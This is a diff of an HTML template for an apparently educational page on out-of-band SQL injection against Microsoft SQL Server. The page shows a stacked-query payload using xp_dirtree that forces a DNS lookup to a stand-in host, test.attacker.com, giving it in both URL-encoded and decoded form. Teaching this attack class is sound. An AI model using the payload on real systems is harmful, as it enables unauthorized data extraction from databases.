@@ -4,39 +4,55 @@
 {% endblock %}
 
 {% block content %}
-<h3>Out-Band SQL Injections</h3>
-Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server.
+<body>
+    <h3>Out-Band SQL Injections</h3>
+    <hr>
+    <div>
+        <h6>Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server.</h6>
+        <h6>These injections involve alternative communication channels to extract data from the server.
+        It might be HTTP(S) requests, DNS resolutions, file systems, E-mails, etc depending on the functionality of the back-end technology.</h6>
+        <h6>Most of these attacks will require the attacker to have a third party system such as a proxy to gather data or listen to the response from the web application.</h6>
+    </div>
+        <hr>
+    <div>
+        <h4 class="text-warning"> Examples </h4>
+        <div>
+            <h6>To understand how this type of SQL injection works, let’s consider the following SQL query that's executed on a Microsoft SQL Server database.</h6>
+            <pre class="alert alert-secondary text-danger">SELECT * FROM products WHERE id={userInput}</pre>
+        </div>
+        <div>
+            <h6>The value of <span class="text-success">id</span> comes from user input, from a URL such as the following.</h6>
+            <pre class="alert alert-secondary text-danger">https://example.com/products.aspx?id=1</pre>
+        </div>
+        <div>
+             <h6>This URL will generate the following SQL query.</h6>
+             <pre class="alert alert-secondary text-danger">SELECT * FROM products WHERE id=1</code></pre>
+        </div>
+        <div>
 
-These sql injection involve in alternative channels to extract data from the server.
-It might be HTTP(S) requests, DNS resolutions, file systems, E-mails, etc depending on the functionality of the back-end
-technology.
-most of those attacks will require the attacker to have a third party system like a proxy to gather data or listen to the response from the web application.
-<br><br>
-<h4> Example </h4>
-<p>To understand how this type of sql injection works, let’s consider the following SQL query that executes on a Microsoft SQL Server database.</p>
-<pre><code>SELECT * FROM products WHERE id={userInput}</code></pre>
-<p>The value of <kbd>id</kbd> comes from user input, from a URL such as the following.</p>
-<pre>https://example.com/products.aspx?id=1</pre>
-<p>This URL will generate the following SQL query.</p>
-<pre><code>SELECT * FROM products WHERE id=1</code></pre>
+        </div>
+    </div>
+    <hr>
+    <div>
+        <h6>Attacker can launch an attack using the <span class="text-success">xp_dirtree</span> command on Microsoft SQL server database.</h6>
+        <pre class="alert alert-secondary text-danger">https://example.com/products.aspx?id=1;EXEC%20master..xp_dirtree%20'%5c%5ctest.attacker.com%5c'+--+</pre>
+        <p>Let’s decode the payload from URL</p>
+        <pre class="alert alert-secondary text-danger">https://example.com/products.aspx?id=1;EXEC master..xp_dirtree '\\test.attacker.com\' --</pre>
+        <p>This will produce the following SQL query.</p>
+        <pre class="alert alert-secondary text-danger">SELECT * FROM products WHERE id=1;EXEC master..xp_dirtree '\\test.attacker.com\' --</pre>
+        <h6>What happened is that there are now two separated queries that the SQL Server will execute.</h6>
+        <div class="alert alert-secondary">
+            <pre class="text-danger">/* First Query */<br>SELECT * FROM products WHERE id=1<br><br>/* Second Query */<br>EXEC master..xp_dirtree '\\test.attacker.com\' --</pre>
+        </div>
 
-<p>Attacker can make attack using the  xp_dirtree command on microsoft sql server database.</p>
-<pre>https://example.com/products.aspx?id=1;EXEC%20master..xp_dirtree%20'%5c%5ctest.attacker.com%5c'+--+</pre>
-<p>Let’s URL decode this payload</p>
-<pre>https://example.com/products.aspx?id=1;EXEC master..xp_dirtree '\\test.attacker.com\' --</pre>
-<p>This will produce the following SQL query.</p>
-<pre><code>SELECT * FROM products WHERE id=1;EXEC master..xp_dirtree '\\test.attacker.com\' -- </code></pre>
-<p>What happened is that there are now two separated queries that SQL Server will execute.</p>
-<pre><code>/* First Query */
-SELECT * FROM products WHERE id=1
-
-/* Second Query */
-EXEC master..xp_dirtree '\\test.attacker.com\' -- </code></pre>
-<p>The second query is invoking a stored procedure <kbd>xp_dirtree</kbd>. This extended stored procedure can be used to
-    get a list of all the folders for the folder named in the xp.</p>
-<p>SQL Server will now proceed to list all the folders from <em>\\test.attacker.com\</em>. To do this, it must first resolve the address of the domain
-    <em>test.attacker.com</em>, for which it makes a DNS query to attacker’s DNS server. The attacker can monitor DNS server logs and look for queries to
-    <em>test.attacker.com</em>.</p>
- This attack can be done only when the feature will be enable on the database , so the database can send dns queries and http requests
+        <h6>The second query is invoking a stored procedure <span class="text-success">xp_dirtree</span>. This extended stored procedure can be used to
+            get a list of all the folders of under the name of <span class="text-success">xp.</span></h6>
+        <h6>SQL Server will now proceed to list all the folders from <em class="text-success">\\test.attacker.com\</em> - It must first resolve the address of the domain
+        <em class="text-success">test.attacker.com</em>, for which it makes a DNS query to attackers' DNS server. The attacker can monitor the DNS server logs and look for queries related to
+        <em class="text-success">test.attacker.com</em>.</h6>
+    </div>
+    <hr>
+    <h6>This attack can be done only when the feature will be enabled on the database, so the database can send DNS queries and HTTP requests.</h6>
+</body>
 
 {% endblock%}
